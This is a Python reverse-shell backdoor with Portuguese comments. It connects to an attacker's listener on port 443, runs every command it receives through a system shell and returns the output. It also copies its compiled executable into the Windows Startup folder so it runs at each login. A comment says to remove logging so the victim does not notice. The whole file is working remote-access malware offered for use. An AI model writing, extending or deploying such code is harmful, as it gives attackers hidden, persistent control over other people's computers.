#CONEXAO TCP

import socket
import time
import subprocess
import threading
import os

IP = ""
#INT PODE SER DO NETCAT
PORT = 443

def autorun():
    filename = os.path.basename(__file__)
    exe_filename = filename.replace(".py", ".exe")
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_filename))


def connect(IP, PORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((IP, PORT))
        return client
    except Exception as error:
        print("error connect", error) # LEMBRAR DE TIRAR LOG AO FINALIZAR, O CLIENTE NAO PRECISA VER O LOG NÉ :p
        

def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        print(proc.stdout.read()) # REMOVER DEPOIS DE FINALIZAR O CÓDIGO
        client.send(proc.stdout.read() + b"\n")
    except Exception as error:
        print("error cmd", error)


def listen(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == "/exit":
                return
            else:
                #AQUI É ONDE DEFINIMOS COMO EXECUTAR COMANDOS     
                threading.Thread(target=cmd, args=(client, data)).start()

    except Exception as error:
        print("Error listen", error)
        client.close()


if __name__ == "__main__":
    while True:
        client = connect(IP, PORT)
        if client:
            listen(client)
        else:
            print("Conexao deu erro, tentando novamente")
            time.sleep(3)